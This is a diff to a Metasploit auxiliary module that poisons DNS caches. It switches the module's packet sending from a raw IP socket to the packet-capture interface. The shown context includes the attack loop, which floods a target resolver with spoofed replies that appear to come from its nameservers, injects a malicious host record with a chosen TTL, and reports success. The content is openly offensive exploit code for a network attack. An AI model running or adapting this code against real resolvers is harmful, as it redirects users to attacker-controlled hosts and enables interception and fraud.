@@ -6,7 +6,7 @@ require 'resolv'
 
 class Metasploit3 < Msf::Auxiliary
 
-	include Msf::Exploit::Remote::Ip
+	include Msf::Exploit::Capture
 
 	def initialize(info = {})
 		super(update_info(info,	
@@ -44,6 +44,8 @@ class Metasploit3 < Msf::Auxiliary
 					OptInt.new('TTL', [true, 'The TTL for the malicious host entry', rand(20000)+30000]),
 					
 				], self.class)
+
+			deregister_options('FILTER','PCAPFILE')
 					
 	end
 	
@@ -254,7 +256,7 @@ class Metasploit3 < Msf::Auxiliary
 		if barbs.length == 0
 			print_status( "No DNS servers found.")
 			srv_sock.close
-			disconnect_ip
+			close_pcap
 			return
 		end
 
@@ -266,7 +268,7 @@ class Metasploit3 < Msf::Auxiliary
 			if(numxids == 0)
 				print_status("The server did not reply, giving up.")
 				srv_sock.close
-				disconnect_ip
+				close_pcap
 				return
 			end			
 			print_status("Sending #{numxids} spoofed replies from each nameserver (#{barbs.length}) for each query")
@@ -276,7 +278,8 @@ class Metasploit3 < Msf::Auxiliary
 		queries = 0
 		responses = 0
 
-		connect_ip if not ip_sock
+
+		open_pcap unless self.capture
 
 		print_status( "Attempting to inject a poison record for #{hostname} into #{target}:#{sport}...")
 
@@ -310,7 +313,7 @@ class Metasploit3 < Msf::Auxiliary
 			n.l4.fix!(n.l3.src_ip, n.l3.dst_ip)	
 			buff = n.pack			
 
-			ip_sock.sendto(buff, target)
+			capture_sendto(buff, target)
 			
 			queries += 1
 			
@@ -333,7 +336,7 @@ class Metasploit3 < Msf::Auxiliary
 					n.l4.fix!(n.l3.src_ip, n.l3.dst_ip)	
 					buff = n.pack
 										
-					ip_sock.sendto(buff, target)
+					capture_sendto(buff, target)
 					responses += 1
 				end
 			end
@@ -348,7 +351,7 @@ class Metasploit3 < Msf::Auxiliary
 					if(numxids == 0)
 						print_status("The server has stopped replying, giving up.")
 						srv_sock.close
-						disconnect_ip
+						close_pcap
 						return
 					end
 					print_status("Now sending #{numxids} spoofed replies from each nameserver (#{barbs.length}) for each query")
@@ -371,7 +374,7 @@ class Metasploit3 < Msf::Auxiliary
 							if((name.to_s + ".") == hostname)
 								print_status("Poisoning successful after #{queries} queries and #{responses} responses: #{name} == #{address}")
 								print_status("TTL: #{ttl} DATA: #{data}")
-								disconnect_ip
+								close_pcap
 								return
 							end
 						end
